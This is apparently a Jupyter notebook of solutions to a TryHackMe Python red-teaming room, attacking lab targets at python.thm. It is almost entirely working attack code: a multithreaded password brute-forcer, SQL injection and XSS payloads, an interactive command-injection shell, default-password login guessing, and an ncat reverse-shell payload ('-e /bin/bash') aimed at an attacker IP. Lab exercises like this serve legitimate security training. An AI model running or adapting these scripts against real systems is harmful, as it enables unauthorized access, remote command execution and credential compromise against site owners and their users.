In [ ]:
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://python.thm/labs/lab1/index.php"
username = "Mark"

# Mark's password pattern: first 3 chars are digits (000-999), last char is uppercase (A-Z)
password_list = [f"{i:03d}{chr(c)}" for i in range(1000) for c in range(ord("A"), ord("Z") + 1)]

MAX_WORKERS = 40
CHUNK_SIZE = 2000
REQUEST_TIMEOUT = 5

def try_password(password):
    try:
        response = requests.post(
            url,
            data={"username": username, "password": password},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException:
        return None

    if "Invalid" in response.text:
        return None

    m = re.search(r"THM\{[^}]+\}", response.text)
    flag = m.group(0) if m else None
    return password, flag

def brute_force_parallel():
    total = len(password_list)
    checked = 0

    for start in range(0, total, CHUNK_SIZE):
        batch = password_list[start:start + CHUNK_SIZE]

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(try_password, pw) for pw in batch]
            for future in as_completed(futures):
                result = future.result()
                checked += 1

                if result is not None:
                    password, flag = result
                    print(f"[+] Found valid credentials: {username}:{password}")
                    if flag:
                        print(f"[+] FLAG: {flag}")
                    else:
                        print("[!] Login succeeded but no THM{...} flag pattern found in response.")
                    return

        print(f"[*] Progress: {min(start + CHUNK_SIZE, total)}/{total}")

    print("[!] No valid password found in the tested keyspace.")

brute_force_parallel()

In [ ]:
import requests
import re
import threading

url = "http://python.thm/labs/lab2/departments.php?name="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"name": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()

In [ ]:
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")

In [ ]:
import requests

# Use only in authorized labs (e.g., TryHackMe room)
BASE_URL = "http://python.thm/labs/lab3/execute.php"
TIMEOUT = 10

def run_cmd(command: str):
    """Send one command and print output."""
    try:
        resp = requests.get(BASE_URL, params={"cmd": command}, timeout=TIMEOUT)
    except requests.RequestException as exc:
        print(f"[-] Request failed: {exc}")
        return

    if resp.status_code == 200:
        print("[+] Command Output:")
        print(resp.text.strip())
    else:
        print(f"[-] Exploit failed. HTTP Status: {resp.status_code}")

def interactive_shell():
    """Interactive command loop."""
    print("[+] Interactive Exploit Shell (type 'exit' to quit)")
    while True:
        cmd = input("Shell> ").strip()
        if cmd.lower() in {"exit", "quit"}:
            break
        if not cmd:
            continue
        run_cmd(cmd)

def send_reverse_shell(lhost: str, lport: int = 4444):
    """Trigger reverse shell payload (requires listener on your attack box)."""
    payload = f"ncat {lhost} {lport} -e /bin/bash"
    print(f"[+] Sending reverse shell payload: {payload}")
    run_cmd(payload)

# --- Quick start examples ---
run_cmd("whoami")
interactive_shell()
#send_reverse_shell("10.113.68.65", 4444)  # <- set your AttackBox/VPN IP

In [ ]:
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD_CANDIDATES = ["password123", "password", "admin123", "letmein", "qwerty", "12345"]
TIMEOUT = 10

def authenticate(username=USERNAME, password_candidates=None):
    """Try known passwords and return an authenticated session."""
    if password_candidates is None:
        password_candidates = PASSWORD_CANDIDATES

    sess = requests.Session()

    for password in password_candidates:
        print(f"[*] Trying login: {username}:{password}")
        try:
            resp = sess.post(
                LOGIN_URL,
                data={"username": username, "password": password},
                timeout=TIMEOUT,
            )
        except requests.RequestException as exc:
            print(f"[-] Login request failed: {exc}")
            continue

        if "Welcome" in resp.text or "dashboard" in resp.text.lower():
            print(f"[+] Authentication successful: {username}:{password}")
            return sess, password

    print("[-] Authentication failed.")
    return None, None

def execute_command(sess, command):
    """Execute one command via vulnerable endpoint."""
    try:
        resp = sess.post(EXECUTE_URL, data={"cmd": command}, timeout=TIMEOUT)
    except requests.RequestException as exc:
        print(f"[-] Command request failed: {exc}")
        return None

    # Session timeout handling
    if "Session expired" in resp.text or "login" in resp.url.lower():
        print("[-] Session expired or redirected to login.")
        return None

    print(f"[+] Command: {command}")
    print(resp.text.strip())
    return resp.text

def send_reverse_shell(sess, attacker_ip, attacker_port=4444):
    """Send reverse shell payload (listener must already be running)."""
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    print(f"[+] Sending reverse shell payload: {payload}")
    execute_command(sess, payload)

# ---------------------------
session, working_password = authenticate()
if session:
    execute_command(session, "whoami")
    execute_command(session, "ls")
    # Start listener first: nc -lvnp 4444
    # Then uncomment next line and set your attackbox IP:
    # send_reverse_shell(session, "10.10.10.10", 4444)

In [ ]:
# Read flag file discovered in ls output
if session:
    execute_command(session, "cat *.txt")

The Power of Code

Coding is an incredible tool to have in your red teaming arsenal. Rapidly developing a program or script that automates a specific function will allow you to stage attacks, gain access to systems, and work more efficiently. 

There are several coding languages out there, each with its own benefits and drawbacks. In this room, we showcased Python, but it is also worth exploring other languages yourself, especially compiled languages. The ability to write your own code, or at the very least modify others' code, is crucial for the red teaming journey!